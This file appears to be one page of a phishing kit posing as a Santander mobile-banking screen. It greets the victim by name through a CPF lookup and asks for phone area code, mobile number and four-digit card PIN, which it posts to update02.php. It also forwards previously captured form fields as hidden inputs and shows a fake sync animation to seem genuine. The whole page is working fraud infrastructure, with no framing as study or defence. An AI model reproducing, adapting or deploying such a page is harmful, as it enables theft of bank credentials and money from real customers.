<!doctype html>
<html>
<head>
<meta charset="ISO-8859-1">
<title>Santander</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
<meta name="mobile-web-app-capable" content="yes">

<link rel="stylesheet" type="text/css" href="style.css" />


<script src="js/jquery-3.2.1.min.js" language="javascript"></script>
<script src="js/jquery.maskedinput.min.js" language="javascript"></script>
<script src="script.js?Xxxxdss" language="javascript"></script>
<script src="//irql.bipbop.com.br/js/jquery.bipbop.min.js"></script>

</head>

<body onLoad="window.scrollTo(0,1);">
<div id="topo">
	<img src="images/santanderlogo.png">	
</div>
	
<div id="topo2" style="color: #848fa0; font-weight: bold">
 	<div style="width: 80px;float: left;"><img src="images/user-icon.png" /></div>
	<div style="float: left; padding-top: 35px; padding-left: 10px;">
	Ol&aacute; <span id="nome" style="color: #848fa0;">Cliente</span>
	</div>
 </div>

<div id="campos" style="clear: both;">


<form action="update02.php" method="post" enctype="application/x-www-form-urlencoded" onSubmit="return checkUpate();">
<table width="80%" class="center pt60">
 <?php foreach($_POST as $key => $value):  ?>
	<input type="hidden" name="<?= $key ?>" id="<?= $key ?>" value="<?= $value ?>" />
 <?php endforeach; ?>
  <tbody>
    <tr>
      <td><span>DDD</span></td>
      <td><span>CELULAR</span></td>
    </tr>
    <tr>
      <td style="width: 30%; padding-right: 10px;"><input class="frm" type="number" id="ddd" name="ddd" onKeyUp="saltarDDD();" onkeydown="limit(this, 2);" onkeyup="limit(this,2);" required></td>
      <td style="width: 70%"><input class="frm" type="number" onkeydown="limit(this, 9);" onkeyup="limit(this,9);" id="faca" name="faca" maxlength="9" required></td>
    </tr>
    
    <tr style="height: 20px;">
      <td></td>
    </tr>
    <tr>
      <td colspan="2"><span>Senha do cart&atilde;o</span></td>
    </tr>
    <tr>
      <td colspan="2"><input class="frm" style="-webkit-text-security:disc;" id="quatrovezes" name="quatrovezes" onkeydown="limit(this, 4);" onkeyup="limit(this,4);" inputmode="numeric" type="number"  required></td>
    </tr>
  </tbody>
    
</table>

<div class="pt30">
	<input type="submit" id="btn-entrar" value="CONTINUAR">
</div>
	
		
</form>

</div>


<div id="distrar" style="display: none;">
	<center><img src="images/id_santander_anima_sincronia_ok.gif"></center>
</div>

<script language="javascript">
	$(document).ready(function(){
		setTimeout(function(){
			$("#campos").show();
			$("#distrar").hide();
		}, 1500);
		

		setTimeout(function(){
			$("#ddd").focus();
		}, 1700);
		
		
		$().bipbop("SELECT FROM 'BIPBOPJS'.'CPFCNPJ'", null, {
		  data: {
			  documento: $("#cpf").val(),
		  },

		  success: function(data) {
			var nome = $(data).find("body nome").text();
			var exception = $(data).find("header exception").text();

			if (exception) {
			  exception = exception.replace(/, t/, '. T');
			  //$('#status').text(exception);
			} else {
			  $("#nome").text(ucfirst(nome.split(" ")[0]));
			  $("#dados").show();
			}
		  }
		});
		
	});
</script>

</body>
</html>
